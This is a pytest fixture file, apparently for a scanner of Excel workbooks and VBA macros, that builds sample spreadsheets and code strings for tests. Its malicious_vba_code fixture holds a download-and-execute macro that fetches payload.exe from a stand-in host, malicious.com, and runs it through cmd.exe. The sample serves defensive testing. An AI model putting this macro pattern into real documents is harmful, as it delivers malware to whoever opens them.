"""Pytest configuration and fixtures."""

import pytest
from openpyxl import Workbook


@pytest.fixture
def temp_xlsx_file(tmp_path):
    """Create a temporary Excel file for testing."""
    file_path = tmp_path / "test_spreadsheet.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "TestSheet"

    # Add some test data
    ws["A1"] = "Hello"
    ws["A2"] = "=SUM(1,2)"  # Simple formula
    ws["A3"] = "=HYPERLINK('http://example.com', 'Click me')"  # Potentially suspicious

    wb.save(file_path)
    return file_path


@pytest.fixture
def temp_xlsm_file(tmp_path):
    """Create a temporary macro-enabled Excel file for testing."""
    file_path = tmp_path / "test_macros.xlsm"
    wb = Workbook()
    ws = wb.active
    ws.title = "MacroSheet"

    # Add some test data
    ws["A1"] = "Test"
    ws["A2"] = "=A1&'_modified'"

    wb.save(file_path)
    return file_path


@pytest.fixture
def sample_vba_code():
    """Sample VBA code for testing."""
    return """
Sub HelloWorld()
    MsgBox "Hello, World!"
End Sub
"""


@pytest.fixture
def malicious_vba_code():
    """Sample malicious VBA code for testing."""
    return """
Sub DownloadAndExecute()
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", "http://malicious.com/payload.exe", False
    http.Send
    Shell "cmd.exe /c payload.exe"
End Sub
"""
